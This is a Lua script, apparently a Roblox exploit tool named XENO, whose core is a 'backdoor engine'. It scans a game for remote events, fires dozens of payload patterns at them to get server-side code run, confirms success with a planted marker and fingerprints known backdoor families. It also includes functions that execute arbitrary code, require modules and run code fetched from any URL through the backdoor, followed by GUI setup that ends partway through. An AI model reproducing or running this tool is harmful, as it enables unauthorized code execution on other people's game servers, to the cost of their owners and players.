--[[
██╗  ██╗███████╗███╗   ██╗ ██████╗ 
╚██╗██╔╝██╔════╝████╗  ██║██╔═══██╗
 ╚███╔╝ █████╗  ██╔██╗ ██║██║   ██║
 ██╔██╗ ██╔══╝  ██║╚██╗██║██║   ██║
██╔╝ ██╗███████╗██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝

XENO | Universal Server-Side Framework v3.2
Production Build — Fingerprinted Backdoor Engine

▸ 30+ Fire Pattern Auto-Detection
▸ Fingerprinted Backdoor Identification
▸ Priority-Ordered Smart Remote Scanner
▸ 10 Known SS Executor Signature Database
▸ 40+ Server-Side Admin Commands
▸ Glassmorphism UI w/ Animated Tabs
▸ Require Script Loader + URL Loader
▸ Integrated Script Hub
▸ Player Management Suite
▸ Server Manipulation Toolkit
▸ Toast Notifications + Command History
▸ Keybind: RightShift to Toggle
]]

-- ═══════════════════════════════════════════════════
--  1 · CONFIGURATION
-- ═══════════════════════════════════════════════════

local CFG = {
    Name           = "XENO",
    Version        = "3.2.0",
    Prefix         = ";",
    ToggleKey      = Enum.KeyCode.RightShift,
    ScanTick       = 10,
    ValidationWait = 0.65,
    ToastLife      = 3.5,
    MaxHistory     = 120,
    Window         = {Width = 680, Height = 470},
    Theme = {
        Primary = Color3.fromRGB(140, 50, 235),
        Accent  = Color3.fromRGB(175, 100, 255),
        Glow    = Color3.fromRGB(155, 70, 255),
        BG      = Color3.fromRGB(14, 14, 22),
        Surface = Color3.fromRGB(22, 22, 34),
        Card    = Color3.fromRGB(28, 28, 44),
        Hover   = Color3.fromRGB(36, 36, 56),
        Border  = Color3.fromRGB(50, 50, 72),
        Text    = Color3.fromRGB(210, 218, 245),
        Sub     = Color3.fromRGB(140, 148, 175),
        OK      = Color3.fromRGB(130, 220, 150),
        Err     = Color3.fromRGB(240, 120, 140),
        Warn    = Color3.fromRGB(245, 215, 130),
    },
}

-- ═══════════════════════════════════════════════════
--  2 · SERVICE CACHE
-- ═══════════════════════════════════════════════════

local Svc = setmetatable({}, {__index = function(s, k)
    local ok, v = pcall(game.GetService, game, k)
    if ok then rawset(s, k, v) end
    return v
end})

local Players   = Svc.Players
local RS        = Svc.ReplicatedStorage
local Lighting  = Svc.Lighting
local WS        = workspace
local TweenSvc  = Svc.TweenService
local UIS       = Svc.UserInputService
local Http      = Svc.HttpService
local RunSvc    = Svc.RunService
local Debris    = Svc.Debris
local CoreGui   = game:GetService("CoreGui")
local LP        = Players.LocalPlayer
local Mouse     = LP:GetMouse()

-- ═══════════════════════════════════════════════════
--  3 · UTILITIES
-- ═══════════════════════════════════════════════════

local U = {}

function U.new(class, props, kids)
    local inst = Instance.new(class)
    local parent = nil
    for k, v in pairs(props or {}) do
        if k == "Parent" then parent = v
        else inst[k] = v end
    end
    for _, child in ipairs(kids or {}) do
        child.Parent = inst
    end
    if parent then inst.Parent = parent end
    return inst
end

function U.tween(inst, goal, dur, style, dir)
    local tw = TweenSvc:Create(inst,
        TweenInfo.new(dur or 0.28, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out),
        goal)
    tw:Play()
    return tw
end

function U.findPlayers(query)
    if not query or query == "" then query = "me" end
    query = query:lower()
    if query == "me"     then return {LP} end
    if query == "all"    then return Players:GetPlayers() end
    if query == "others" then
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP then t[#t+1] = p end
        end
        return t
    end
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():sub(1, #query) == query
        or p.DisplayName:lower():sub(1, #query) == query then
            t[#t+1] = p
        end
    end
    return t
end

function U.uid()
    return Http:GenerateGUID(false):sub(1, 8)
end

function U.marker()
    return "XENO_V_" .. math.random(100000, 999999)
end

-- ═══════════════════════════════════════════════════
--  4 · BACKDOOR ENGINE — FINGERPRINTED SCANNER
-- ═══════════════════════════════════════════════════

local BD = {
    active     = nil,
    scanning   = false,
    confirmed  = {},
    tested     = {},
}

-- ┌─────────────────────────────────────────────────┐
-- │  EXACT NAME SIGNATURES                          │
-- │  Known backdoor remote names from:              │
-- │  Hydrogen, ServerCrusher, Aztup, Nihon,         │
-- │  Backdoor.exe, JEBI, Nexus, Dansploit,          │
-- │  Owl Hub SS, IY SS variants                     │
-- └─────────────────────────────────────────────────┘

BD.exactNames = {
    -- Classic free model backdoors
    "Backdoor", "backdoor", "BACKDOOR",
    "Execute", "execute", "EXECUTE",
    "MainEvent", "mainEvent", "mainevent",
    "ServerEvent", "serverevent",
    "Handler", "handler",
    "Bridge", "bridge",

    -- Hydrogen SS
    "Hydrogen", "HydrogenEvent", "H_Event",
    "HydrogenRemote", "H_RE",

    -- ServerCrusher
    "Crusher", "CrusherEvent", "SC_Event",
    "ServerCrusher",

    -- Aztup Hub
    "AztupEvent", "Aztup", "AztupRemote",

    -- Nihon SS
    "NihonEvent", "Nihon", "NH_Event",

    -- JEBI SS
    "JEBIEvent", "JEBI", "JebiRemote",

    -- Nexus SS
    "NexusEvent", "Nexus", "NX_Event",

    -- Dansploit SS
    "DansEvent", "Dansploit", "DAN_RE",

    -- Owl Hub SS
    "OwlEvent", "OwlRemote", "OWL_SS",

    -- IY SS
    "IYEvent", "IY_SS", "InfYield",

    -- Backdoor.exe
    "BDEvent", "BD_Exec", "BDRemote",

    -- Common obfuscated single chars
    "e", "r", "f", "x", "a", "b", "c", "d",
    "E", "R", "F", "X", "A", "B", "C", "D",

    -- Common short combos
    "re", "ev", "fe", "rf", "xe", "rx",
    "RE", "EV", "FE", "RF",
    "lol", "abc", "xyz", "hi", "ok", "gg",
    "LOL", "ABC", "XYZ",
    "aaa", "bbb", "eee", "rrr",

    -- Generic free model names
    "Event", "RemoteEvent", "Remote",
    "Fire", "fire", "Run", "run",
    "Comm", "comm", "Network", "network",
    "Gate", "gate", "Relay", "relay",
    "Hook", "hook", "Main", "main",
    "Load", "load", "Source", "source",
    "Exec", "exec", "Code", "code",
    "ServerRemote", "ClientToServer",
    "Communicate", "Signal", "signal",
    "Tunnel", "tunnel", "Pipe", "pipe",
    "Link", "link", "Socket", "socket",
    "Channel", "channel",

    -- Numeric / hex names
    "1", "2", "3", "69", "420", "1337", "666",
    "0x1", "0x2", "0xFF",

    -- Blank / weird
    "", " ", "  ", ".",
}

-- Pattern matches (name contains substring)
BD.namePatterns = {
    "backdoor", "backd00r", "b4ckd00r",
    "execut",  "loadstr", "loadstring",
    "server.*event", "remote.*event",
    "hydrogen", "crusher", "aztup",
    "nihon", "jebi", "nexus", "dansploit",
    "owl.*hub", "owl.*ss",
    "ss.*event", "ss.*remote",
    "serversid", "server_side",
    "admin.*event", "admin.*remote",
    "exploit", "hack", "cheat",
    "inject", "payload",
    "cmd", "command",
    "require.*event", "require.*remote",
    "free.*model", "fm.*event",
}

-- ┌─────────────────────────────────────────────────┐
-- │  FIRE PATTERNS                                  │
-- │  30 RemoteEvent + 10 RemoteFunction patterns    │
-- └─────────────────────────────────────────────────┘

BD.patterns = {
    -- Raw string (most common ~40%)
    {name = "Raw String",         fn = function(r, c) r:FireServer(c) end},

    -- Key-value tables (Hydrogen style)
    {name = "Table {Code=}",      fn = function(r, c) r:FireServer({Code = c}) end},
    {name = "Table {code=}",      fn = function(r, c) r:FireServer({code = c}) end},
    {name = "Table {Source=}",    fn = function(r, c) r:FireServer({Source = c}) end},
    {name = "Table {source=}",    fn = function(r, c) r:FireServer({source = c}) end},
    {name = "Table {Src=}",       fn = function(r, c) r:FireServer({Src = c}) end},
    {name = "Table {cmd=}",       fn = function(r, c) r:FireServer({cmd = c}) end},

    -- String key + code (Aztup / Nexus style)
    {name = '"execute", code',    fn = function(r, c) r:FireServer("execute", c) end},
    {name = '"run", code',        fn = function(r, c) r:FireServer("run", c) end},
    {name = '"exec", code',       fn = function(r, c) r:FireServer("exec", c) end},
    {name = '"load", code',       fn = function(r, c) r:FireServer("load", c) end},
    {name = '"loadstring", c',    fn = function(r, c) r:FireServer("loadstring", c) end},
    {name = '"code", code',       fn = function(r, c) r:FireServer("code", c) end},
    {name = '"cmd", code',        fn = function(r, c) r:FireServer("cmd", c) end},

    -- Empty/nil key (ServerCrusher style)
    {name = '"", code',           fn = function(r, c) r:FireServer("", c) end},
    {name = "nil, code",          fn = function(r, c) r:FireServer(nil, c) end},

    -- Array table (Nihon style)
    {name = "Table {[1]=code}",   fn = function(r, c) r:FireServer({c}) end},
    {name = '{code, "execute"}',  fn = function(r, c) r:FireServer({c, "execute"}) end},

    -- Password-protected
    {name = '"admin", code',      fn = function(r, c) r:FireServer("admin", c) end},
    {name = '"owner", code',      fn = function(r, c) r:FireServer("owner", c) end},
    {name = '"pass", code',       fn = function(r, c) r:FireServer("pass", c) end},
    {name = '"key", code',        fn = function(r, c) r:FireServer("key", c) end},
    {name = '"debug", code',      fn = function(r, c) r:FireServer("debug", c) end},

    -- Boolean flag + code
    {name = "true, code",         fn = function(r, c) r:FireServer(true, c) end},
    {name = "false, code",        fn = function(r, c) r:FireServer(false, c) end},

    -- Player ref + code (JEBI style)
    {name = "Player, code",       fn = function(r, c) r:FireServer(Players.LocalPlayer, c) end},
    {name = "UserId, code",       fn = function(r, c) r:FireServer(Players.LocalPlayer.UserId, c) end},

    -- Multi-arg (Dansploit style)
    {name = '"ss","exec",code',   fn = function(r, c) r:FireServer("ss", "execute", c) end},
    {name = '"server", code',     fn = function(r, c) r:FireServer("server", c) end},

    -- Number key + code
    {name = "1, code",            fn = function(r, c) r:FireServer(1, c) end},
    {name = "0, code",            fn = function(r, c) r:FireServer(0, c) end},
    {name = "69, code",           fn = function(r, c) r:FireServer(69, c) end},
    {name = "420, code",          fn = function(r, c) r:FireServer(420, c) end},
}

BD.rfPatterns = {
    {name = "Raw String",         fn = function(r, c) return r:InvokeServer(c) end},
    {name = "Table {Code=}",      fn = function(r, c) return r:InvokeServer({Code = c}) end},
    {name = "Table {code=}",      fn = function(r, c) return r:InvokeServer({code = c}) end},
    {name = "Table {Source=}",    fn = function(r, c) return r:InvokeServer({Source = c}) end},
    {name = '"execute", code',    fn = function(r, c) return r:InvokeServer("execute", c) end},
    {name = '"", code',           fn = function(r, c) return r:InvokeServer("", c) end},
    {name = "nil, code",          fn = function(r, c) return r:InvokeServer(nil, c) end},
    {name = "Table {[1]=code}",   fn = function(r, c) return r:InvokeServer({c}) end},
    {name = "true, code",         fn = function(r, c) return r:InvokeServer(true, c) end},
    {name = "Player, code",       fn = function(r, c) return r:InvokeServer(Players.LocalPlayer, c) end},
}

-- ┌─────────────────────────────────────────────────┐
-- │  FINGERPRINTING ENGINE                          │
-- └─────────────────────────────────────────────────┘

BD.fingerprints = {
    {
        name = "Hydrogen SS",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("hydrogen") or n:find("h_") then return true end
            if patternName == "Table {Code=}" and remote:IsDescendantOf(RS) then return true end
            return false
        end,
    },
    {
        name = "ServerCrusher",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("crush") or n:find("sc_") then return true end
            if (patternName == '"", code' or patternName == "nil, code") and #remote.Name <= 3 then return true end
            return false
        end,
    },
    {
        name = "Aztup Hub",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("aztup") then return true end
            if patternName == '"execute", code' and n:find("event") then return true end
            return false
        end,
    },
    {
        name = "Nihon SS",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("nihon") or n:find("nh_") then return true end
            if patternName == "Table {[1]=code}" then return true end
            return false
        end,
    },
    {
        name = "JEBI SS",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("jebi") then return true end
            if patternName == "Player, code" or patternName == "UserId, code" then return true end
            return false
        end,
    },
    {
        name = "Nexus SS",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("nexus") or n:find("nx_") then return true end
            return false
        end,
    },
    {
        name = "Dansploit SS",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("dans") or n:find("dan_") then return true end
            if patternName == '"ss","exec",code' then return true end
            return false
        end,
    },
    {
        name = "Owl Hub SS",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("owl") then return true end
            return false
        end,
    },
    {
        name = "IY SS Variant",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("iy") or n:find("infyield") or n:find("infinite") then return true end
            return false
        end,
    },
    {
        name = "Backdoor.exe",
        check = function(remote, patternName)
            local n = remote.Name:lower()
            if n:find("bd_") or n:find("bdexec") or n:find("bdevent") then return true end
            return false
        end,
    },
    {
        name = "Password Protected",
        check = function(remote, patternName)
            if patternName and (patternName:find('"admin"') or patternName:find('"owner"')
                or patternName:find('"pass"') or patternName:find('"key"')
                or patternName:find('"debug"')) then
                return true
            end
            return false
        end,
    },
    {
        name = "Classic Free Model",
        check = function(remote, patternName)
            if patternName == "Raw String" then
                local n = remote.Name:lower()
                if #remote.Name <= 3 or n:find("event") or n:find("remote") then
                    return true
                end
            end
            return false
        end,
    },
    {
        name = "Obfuscated Backdoor",
        check = function(remote, patternName)
            local n = remote.Name
            if n:match("^%x+$") and #n >= 6 then return true end
            if #n > 20 then return true end
            if n:match("^[%w_]+$") == nil and #n > 1 then return true end
            return false
        end,
    },
}

function BD:fingerprint(remote, patternName)
    for _, fp in ipairs(self.fingerprints) do
        local ok, result = pcall(fp.check, remote, patternName)
        if ok and result then
            return fp.name
        end
    end
    return "Unknown Type"
end

-- ┌─────────────────────────────────────────────────┐
-- │  SMART REMOTE GATHERING                         │
-- │  Priority: exact > pattern > short > other      │
-- └─────────────────────────────────────────────────┘

function BD:gatherRemotes()
    local priority1 = {}
    local priority2 = {}
    local priority3 = {}
    local priority4 = {}

    local exactSet = {}
    for _, name in ipairs(self.exactNames) do
        exactSet[name] = true
    end

    local allContainers = {}
    local addedSet = {}
    local function tryAdd(svcName)
        pcall(function()
            local s = game:GetService(svcName)
            if s and not addedSet[s] then
                allContainers[#allContainers+1] = s
                addedSet[s] = true
            end
        end)
    end

    tryAdd("ReplicatedStorage")
    tryAdd("Workspace")
    tryAdd("Lighting")
    tryAdd("StarterGui")
    tryAdd("StarterPlayer")
    tryAdd("StarterPack")
    tryAdd("ReplicatedFirst")
    tryAdd("Chat")
    tryAdd("SoundService")
    tryAdd("Teams")
    tryAdd("TestService")
    tryAdd("JointsService")

    pcall(function()
        for _, child in ipairs(game:GetChildren()) do
            if not addedSet[child] then
                pcall(function()
                    child:GetDescendants()
                    allContainers[#allContainers+1] = child
                    addedSet[child] = true
                end)
            end
        end
    end)

    for _, root in ipairs(allContainers) do
        pcall(function()
            for _, obj in ipairs(root:GetDescendants()) do
                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction"))
                   and not self.tested[obj] then

                    if exactSet[obj.Name] then
                        priority1[#priority1+1] = obj
                    else
                        local matched = false
                        local lowName = obj.Name:lower()
                        for _, pat in ipairs(self.namePatterns) do
                            if lowName:find(pat) then
                                priority2[#priority2+1] = obj
                                matched = true
                                break
                            end
                        end
                        if not matched then
                            if #obj.Name <= 3 then
                                priority3[#priority3+1] = obj
                            else
                                priority4[#priority4+1] = obj
                            end
                        end
                    end
                end
            end
        end)
    end

    local result = {}
    for _, t in ipairs({priority1, priority2, priority3, priority4}) do
        for _, r in ipairs(t) do
            result[#result+1] = r
        end
    end
    return result, #priority1, #priority2, #priority3, #priority4
end

-- ┌─────────────────────────────────────────────────┐
-- │  VALIDATION ENGINE                              │
-- │  Fire → Wait → Check marker → Confirm           │
-- └─────────────────────────────────────────────────┘

function BD:validate(remote)
    local tag = U.marker()
    local testCode = string.format(
        'pcall(function() '
        .. 'local v = Instance.new("StringValue"); '
        .. 'v.Name = "%s"; '
        .. 'v.Value = "xeno_confirmed"; '
        .. 'v.Parent = game:GetService("ReplicatedStorage"); '
        .. 'game:GetService("Debris"):AddItem(v, 10) '
        .. 'end)',
        tag
    )

    local pats = remote:IsA("RemoteFunction") and self.rfPatterns or self.patterns

    for idx, pat in ipairs(pats) do
        pcall(function() pat.fn(remote, testCode) end)
        task.wait(CFG.ValidationWait)

        local found = RS:FindFirstChild(tag)
        if found then
            pcall(function() found:Destroy() end)
            return true, idx, pat.name
        end
    end

    self.tested[remote] = true
    return false, nil, nil
end

-- ┌─────────────────────────────────────────────────┐
-- │  FULL SCAN                                      │
-- └─────────────────────────────────────────────────┘

function BD:scan(statusCallback)
    if self.scanning then return self.confirmed end
    self.scanning = true
    self.confirmed = {}

    if statusCallback then statusCallback("gathering", 0) end

    local remotes, p1, p2, p3, p4 = self:gatherRemotes()
    local totalRemotes = #remotes

    if statusCallback then
        statusCallback("gathered", totalRemotes, 0, nil, {
            exact = p1, pattern = p2, short = p3, other = p4,
        })
    end

    for i, remote in ipairs(remotes) do
        if self.tested[remote] then continue end

        if statusCallback then
            statusCallback("validating", totalRemotes, i, remote.Name)
        end

        local valid, patIdx, patName = self:validate(remote)

        if valid then
            local fpName = self:fingerprint(remote, patName)
            local entry = {
                inst        = remote,
                name        = remote.Name,
                path        = remote:GetFullName(),
                type        = remote.ClassName,
                patternIdx  = patIdx,
                patternName = patName,
                fingerprint = fpName,
            }
            self.confirmed[#self.confirmed+1] = entry

            if statusCallback then
                statusCallback("found", totalRemotes, i, remote.Name, entry)
            end
        end

        self.tested[remote] = true
    end

    self.scanning = false
    if statusCallback then statusCallback("done", #self.confirmed) end
    return self.confirmed
end

function BD:connect(entry)
    self.active = entry
end

function BD:disconnect()
    self.active = nil
end

function BD:isConnected()
    return self.active ~= nil
end

function BD:exec(code)
    if not self.active then return false, "No backdoor connected" end
    local remote = self.active.inst
    local patIdx = self.active.patternIdx
    local pats   = remote:IsA("RemoteFunction") and self.rfPatterns or self.patterns
    local pat    = pats[patIdx]
    if not pat then return false, "Invalid pattern" end
    local ok, err = pcall(function() pat.fn(remote, code) end)
    return ok, err
end

function BD:requireModule(id)
    local src = string.format(
        'pcall(function() '
        .. 'local m = require(%d); '
        .. 'if type(m) == "function" then m() '
        .. 'elseif type(m) == "table" then '
        .. '  if m.init then m.init() '
        .. '  elseif m.Init then m.Init() '
        .. '  elseif m.Start then m.Start() '
        .. '  elseif m.Run then m.Run() '
        .. '  elseif m.Execute then m.Execute() '
        .. '  end '
        .. 'end '
        .. 'end)',
        tonumber(id) or 0
    )
    return self:exec(src)
end

function BD:loadUrl(url)
    local src = string.format(
        'loadstring(game:GetService("HttpService"):GetAsync("%s"))()',
        tostring(url)
    )
    return self:exec(src)
end

function BD:resetScanned()
    self.tested = {}
    self.confirmed = {}
end

-- ═══════════════════════════════════════════════════
--  5 · NOTIFICATION SYSTEM (forward decl)
-- ═══════════════════════════════════════════════════

local Notify

-- ═══════════════════════════════════════════════════
--  6 · GUI CONSTRUCTION
-- ═══════════════════════════════════════════════════

local gui = Instance.new("ScreenGui")
gui.Name = "XenoFramework_" .. U.uid()
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn  = false
gui.IgnoreGuiInset = true
gui.DisplayOrder  = 999

pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
pcall(function() if gethui then gui.Parent = gethui(); return end end)
local guiOk = pcall(function() gui.Parent = CoreGui end)
if not guiOk then gui.Parent = LP:WaitForChild("PlayerGui") end

local T = CFG.Theme

-- Toast container
local toastHolder = U.new("Frame", {
    Name = "Toasts",
    Size = UDim2.new(0, 300, 1, 0),
    Position = UDim2.new(1, -310, 0, 0),
    BackgroundTransparency = 1,
    Parent = gui,
}, {
    U.new("UIListLayout", {
        Padding = UDim.new(0, 6),
        VerticalAlignment = Enum.VerticalAlignment.Bottom,
        HorizontalAlignment = Enum.HorizontalAlignment.Center,
        SortOrder = Enum.SortOrder.LayoutOrder,
    }),
    U.new("UIPadding", {PaddingBottom = UDim.new(0, 18)}),
})

Notify = function(text, color, duration)
    color = color or T.Text
    duration = duration or CFG.ToastLife
    local toast = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 36),
        BackgroundColor3 = T.Surface,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ClipsDescendants = true,
        Parent = toastHolder,
    }, {
        U.new("UICorner", {CornerRadius = UDim.new(0, 8)}),
        U.new("UIStroke", {Color = color, Thickness = 1, Transparency = 0.55}),
        U.new("Frame", {
            Size = UDim2.new(0, 3, 1, 0),
            BackgroundColor3 = color,
            BorderSizePixel = 0,
        }),
        U.new("TextLabel", {
            Size = UDim2.new(1, -16, 1, 0),
            Position = UDim2.new(0, 14, 0, 0),
            BackgroundTransparency = 1,
            Text = text,
            TextColor3 = T.Text,
            TextSize = 13,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
            TextTruncate = Enum.TextTruncate.AtEnd,
        }),
    })
    U.tween(toast, {BackgroundTransparency = 0.12}, 0.3)
    task.delay(duration, function()
        U.tween(toast, {BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 0)}, 0.35)
        task.wait(0.38)
        pcall(function() toast:Destroy() end)
    end)
end

-- Main Window
local W = CFG.Window
local main = U.new("Frame", {
    Name = "Main",
    Size = UDim2.new(0, W.Width, 0, W.Height),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundColor3 = T.BG,
    BorderSizePixel = 0,
    ClipsDescendants = true,
    Parent = gui,
}, {
    U.new("UICorner", {CornerRadius = UDim.new(0, 12)}),
    U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.3}),
})

-- Drop shadow
U.new("ImageLabel", {
    Name = "Shadow",
    Size = UDim2.new(1, 44, 1, 44),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundTransparency = 1,
    Image = "rbxassetid://6015897843",
    ImageColor3 = Color3.new(0, 0, 0),
    ImageTransparency = 0.5,
    ScaleType = Enum.ScaleType.Slice,
    SliceCenter = Rect.new(49, 49, 450, 450),
    ZIndex = -1,
    Parent = main,
})

-- Top bar
local topBar = U.new("Frame", {
    Name = "TopBar",
    Size = UDim2.new(1, 0, 0, 40),
    BackgroundColor3 = T.Surface,
    BorderSizePixel = 0,
    Parent = main,
}, {
    U.new("UICorner", {CornerRadius = UDim.new(0, 12)}),
    U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 14),
        Position = UDim2.new(0, 0, 1, -14),
        BackgroundColor3 = T.Surface,
        BorderSizePixel = 0,
    }),
})

U.new("TextLabel", {
    Size = UDim2.new(0, 200, 1, 0),
    Position = UDim2.new(0, 16, 0, 0),
    BackgroundTransparency = 1,
    Text = "⚡ XENO",
    TextColor3 = T.Primary,
    TextSize = 16,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = topBar,
})

U.new("TextLabel", {
    Size = UDim2.new(0, 60, 1, 0),
    Position = UDim2.new(0, 86, 0, 0),
    BackgroundTransparency = 1,
    Text = "v" .. CFG.Version,
    TextColor3 = T.Sub,
    TextSize = 11,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = topBar,
})

local statusDot = U.new("Frame", {
    Size = UDim2.new(0, 8, 0, 8),
    Position = UDim2.new(0, 150, 0.5, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    BackgroundColor3 = T.Sub,
    BorderSizePixel = 0,
    Parent = topBar,
}, {U.new("UICorner", {CornerRadius = UDim.new(1, 0)})})

local statusLabel = U.new("TextLabel", {
    Size = UDim2.new(0, 160, 1, 0),
    Position = UDim2.new(0, 164, 0, 0),
    BackgroundTransparency = 1,
    Text = "Starting...",
    TextColor3 = T.Sub,
    TextSize = 11,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextTruncate = Enum.TextTruncate.AtEnd,
    Parent = topBar,
})

local function setStatus(text, color)
    statusLabel.Text = text
    U.tween(statusDot, {BackgroundColor3 = color}, 0.3)
end

-- Window controls
local controlsLayout = U.new("Frame", {
    Size = UDim2.new(0, 74, 0, 32),
    Position = UDim2.new(1, -82, 0.5, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    BackgroundTransparency = 1,
    Parent = topBar,
}, {
    U.new("UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal,
        Padding = UDim.new(0, 6),
        VerticalAlignment = Enum.VerticalAlignment.Center,
        SortOrder = Enum.SortOrder.LayoutOrder,
    }),
})

local function windowBtn(icon, order, callback)
    local btn = U.new("TextButton", {
        Size = UDim2.new(0, 32, 0, 32),
        BackgroundColor3 = T.Card,
        BackgroundTransparency = 0.6,
        BorderSizePixel = 0,
        Text = icon,
        TextColor3 = T.Sub,
        TextSize = 16,
        Font = Enum.Font.GothamBold,
        AutoButtonColor = false,
        LayoutOrder = order,
        Parent = controlsLayout,
    }, {U.new("UICorner", {CornerRadius = UDim.new(0, 8)})})
    btn.MouseEnter:Connect(function()
        U.tween(btn, {BackgroundTransparency = 0.2, TextColor3 = T.Text}, 0.18)
    end)
    btn.MouseLeave:Connect(function()
        U.tween(btn, {BackgroundTransparency = 0.6, TextColor3 = T.Sub}, 0.18)
    end)
    btn.MouseButton1Click:Connect(callback)
    return btn
end

local minimized = false
windowBtn("—", 1, function()
    minimized = not minimized
    if minimized then
        U.tween(main, {Size = UDim2.new(0, W.Width, 0, 40)}, 0.35)
    else
        U.tween(main, {Size = UDim2.new(0, W.Width, 0, W.Height)}, 0.35)
    end
end)

windowBtn("✕", 2, function()
    U.tween(main, {Size = UDim2.new(0, 0, 0, 0)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    task.wait(0.42)
    gui:Destroy()
end)

-- Draggable
do
    local dragging, dragStart, startPos
    topBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos  = main.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            main.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
end

-- ═══════════════════════════════════════════════════
--  7 · SIDEBAR + PAGE SYSTEM
-- ═══════════════════════════════════════════════════

local sidebar = U.new("Frame", {
    Name = "Sidebar",
    Size = UDim2.new(0, 150, 1, -40),
    Position = UDim2.new(0, 0, 0, 40),
    BackgroundColor3 = T.Surface,
    BorderSizePixel = 0,
    Parent = main,
}, {
    U.new("UIPadding", {PaddingTop = UDim.new(0,10), PaddingLeft = UDim.new(0,8), PaddingRight = UDim.new(0,8)}),
    U.new("UIListLayout", {
        Padding = UDim.new(0, 4),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }),
})

local pageContainer = U.new("Frame", {
    Name = "Pages",
    Size = UDim2.new(1, -150, 1, -40),
    Position = UDim2.new(0, 150, 0, 40),
    BackgroundColor3 = T.BG,
    BorderSizePixel = 0,
    ClipsDescendants = true,
    Parent = main,
})

local pages = {}
local currentTab = nil
local tabButtons = {}

local function makePage(name)
    local page = U.new("ScrollingFrame", {
        Name = name,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ScrollBarThickness = 3,
        ScrollBarImageColor3 = T.Primary,
        CanvasSize = UDim2.new(0, 0, 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        Visible = false,
        Parent = pageContainer,
    }, {
        U.new("UIListLayout", {
            Padding = UDim.new(0, 8),
            SortOrder = Enum.SortOrder.LayoutOrder,
            HorizontalAlignment = Enum.HorizontalAlignment.Center,
        }),
        U.new("UIPadding", {
            PaddingTop = UDim.new(0,14), PaddingBottom = UDim.new(0,14),
            PaddingLeft = UDim.new(0,14), PaddingRight = UDim.new(0,14),
        }),
    })
    pages[name] = page
    return page
end

local function switchTab(name)
    if currentTab == name then return end
    for n, p in pairs(pages) do
        p.Visible = (n == name)
    end
    for n, btn in pairs(tabButtons) do
        if n == name then
            U.tween(btn, {BackgroundColor3 = T.Primary, BackgroundTransparency = 0.15}, 0.22)
            U.tween(btn, {TextColor3 = T.Text}, 0.22)
        else
            U.tween(btn, {BackgroundColor3 = T.Card, BackgroundTransparency = 0.7}, 0.22)
            U.tween(btn, {TextColor3 = T.Sub}, 0.22)
        end
    end
    currentTab = name
end

local tabDefs = {
    {name = "Dashboard", icon = "⌂",   order = 1},
    {name = "Players",   icon = "♟",   order = 2},
    {name = "Commands",  icon = "›_",  order = 3},
    {name = "Scripts",   icon = "{ }", order = 4},
    {name = "Server",    icon = "⚙",   order = 5},
}

for _, td in ipairs(tabDefs) do
    makePage(td.name)
    local btn = U.new("TextButton", {
        Size = UDim2.new(1, 0, 0, 34),
        BackgroundColor3 = T.Card,
        BackgroundTransparency = 0.7,
        BorderSizePixel = 0,
        Text = "  " .. td.icon .. "   " .. td.name,
        TextColor3 = T.Sub,
        TextSize = 13,
        Font = Enum.Font.GothamSemibold,
        TextXAlignment = Enum.TextXAlignment.Left,
        AutoButtonColor = false,
        LayoutOrder = td.order,
        Parent = sidebar,
    }, {U.new("UICorner", {CornerRadius = UDim.new(0, 8)})})
    btn.MouseEnter:Connect(function()
        if currentTab ~= td.name then U.tween(btn, {BackgroundTransparency = 0.4}, 0.15) end
    end)
    btn.MouseLeave:Connect(function()
        if currentTab ~= td.name then U.tween(btn, {BackgroundTransparency = 0.7}, 0.15) end
    end)
    btn.MouseButton1Click:Connect(function() switchTab(td.name) end)
    tabButtons[td.name] = btn
end

